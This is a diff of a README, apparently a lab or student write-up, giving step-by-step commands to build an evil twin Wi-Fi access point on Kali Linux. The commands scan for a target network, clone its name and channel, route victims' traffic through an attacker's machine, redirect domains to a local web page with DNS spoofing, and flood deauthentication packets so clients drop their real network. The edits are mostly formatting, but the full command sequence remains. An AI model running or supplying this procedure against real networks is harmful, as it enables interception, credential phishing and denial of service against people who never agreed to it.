@@ -10,7 +10,6 @@ This document outlines the steps we took in order to setup an evil twin access p
 # Prerequisites
 - kali linux
 - may need an external usb wifi adapter
-- sudo apt-get instal dsniff
 
 1. Update Device and install dependencies
 	```
@@ -25,9 +24,11 @@ This document outlines the steps we took in order to setup an evil twin access p
 	
 2. Configure dns masq
 
-	`mkdir /Desktop/eviltwin`
-	`cd /Desktop/eviltwin`
-	`touch dnsmasq.conf`
+	```
+	mkdir /Desktop/eviltwin
+	cd /Desktop/eviltwin
+	touch dnsmasq.conf
+	```
 
 	Enter these details into dnsmasq.conf:
 	```
@@ -49,42 +50,42 @@ This document outlines the steps we took in order to setup an evil twin access p
 	unmanaged-devices:mac=AA:BB:CC:DD:EE:FF, A2:B2:C2:D2:E2:F2
 	```
 
-4. View available internet interfaces
+4. View available internet interfaces  
 	`iwconfig`
 	You should see several devices such as eth0, wlan0, lo, etc.
 	Now plug in your usb wireless adapter and run the command again.
 	`iwconfig`
 	You should see your new network device with the name of something like wlan1 for example. You will need this for the next step.
 
-5. Enable the wireless adapter
+5. Enable the wireless adapter  
 	`ifconfig wlan1 up`
 
-6. Ensure the wireless card is not connected to internet
+6. Ensure the wireless card is not connected to internet  
 	`nmcli con`
 	If it is connected, disconnect it from the network that is connected to our adapter
 	`nmcli con down <UUID>`
 
-7. Now we will create a monitor interface by putting the wireless adapter into monitor mode.
+7. Now we will create a monitor interface by putting the wireless adapter into monitor mode.  
 	`airmon-ng start wlan1`
 	You will likely see a message that says to run `airmon-ng check kill` to kill interfering processes. We can safely ignore this.
 
-8. Look at iwconfig again and we can see our new network monitoring device.
+8. Look at iwconfig again and we can see our new network monitoring device.  
 	`iwconfig`
 	It will have a name such as `wlan1mon`.
 
-9. Find the device to spoof and record the BSSID (mac address), channel, and ESSID
-	 first update known manufacturer mac addresses of routers: `airodump-ng-oui-update`
+9. Find the device to spoof and record the BSSID (mac address), channel, and ESSID  
+	 First update known manufacturer mac addresses of routers: `airodump-ng-oui-update`
 	 Then get a list of all the devices broadcasting around you.
 	`airodump-ng wlan1mon`
 	Look under the ESSID column for the name of the network you want to spoof.
 	When you see it hit `ctrl+c` and then copy that line to a text file.
 	Copy down the BSSID (MAC address), CH (channel), and ESSID (Wireless access point name) values.
 
-9. Now for fun, take a look at the devices connected to that network.
+9. Now for fun, take a look at the devices connected to that network.  
 	Enter the BSSID from the previous step in this command
 	`airodump-ng -d <BSSID> wlan1mon`
 
-9. Lets boost our signal strength, to the max legal limit in the US.
+9. Lets boost our signal strength, to the max legal limit in the US.  
 	Note that not all wireless adapters support this.
 	```
 	ifconfig wlan1mon down     
@@ -93,16 +94,16 @@ This document outlines the steps we took in order to setup an evil twin access p
 	```
 	Again check the signal strength with `iwconfig wlan1mon`
 
-9. start up the evil twin AP (access point)
+9. start up the evil twin AP (access point)  
 	Give the evil twin the same name as the network you are attacking on the same channel.
 	`airbase-ng -e "EvilTwinName" -c 11 wlan1mon`
 	At this point you should be able to see your evil network listed under the available wireless networks on your phone or computer. 
 
-10. Give the evil twin can access the internet.
+10. Give the evil twin can access the internet.  
 	`ifconfig at0`
 	give at0 an ip address: `ifconfig at0 10.0.0.1 up`
 
-11. route all traffic through the at0 interface.
+11. route all traffic through the at0 interface.  
 	The device wlan0, or eth0 in the second line, must be the interface connected to the internet for this to work. It must be a different interface than the monitoring device.
 	```
 	iptables --flush
@@ -115,30 +116,29 @@ This document outlines the steps we took in order to setup an evil twin access p
 	`sudo update-alternatives --config iptables`
 	Select the `/usr/sbin/iptables-legacy 10 manual mode` option
 
-12. enable port forwarding: `echo 1 > /proc/sys/net/ipv4/ip_forward`
+12. enable port forwarding  
+	`echo 1 > /proc/sys/net/ipv4/ip_forward`
 
-13. evil twin is now setup, now need to allocate ip addresses to clients
+13. evil twin is now setup, now need to allocate ip addresses to clients  
 	`dnsmasq -C /root/Desktop/dnsmasq.conf -d`
 	Congratulations, you have setup hotspot for yourself.
 
-14. Now we can start a local Apache webserver that we can redirect traffic to.
+14. Now we can start a local Apache webserver that we can redirect traffic to.  
 	Place a webpage under `/var/www/html/index.html`. Ours is named index.html. 
 	Start the server: `sudo /etc/init.d/apache2 start`
 
-15. Your apache server is running locally. Record the IP address
+15. Your apache server is running locally. Record the IP address  
 	`hostname -I` will give you your devices ip address. Additionally you can use localhost which is `127.0.0.1`
 
-15. Now we can do some dns spoofing.
+15. Now we can do some dns spoofing.  
 	Create a file `config/dnsspoof.conf`
 	Add urls you want to spoof to it. For example this will redirect anyone trying to visit http://www.example.com to our local apache server. 
 	`127.0.0.1	example.com`
 	Note that the ip address and url must be separated by a tab, not spaces.
 	You can add as many lines like this as you like for redirecting traffic.
 
-16. Now deauthorize clients so they connect to our network instead of their legit network.
-	
+16. Now deauthorize clients so they connect to our network instead of their legit network.  
 	`aireplay-ng –deauth 0 -a <BSSID> wlan1mon`
-
 
 
 # Caveats
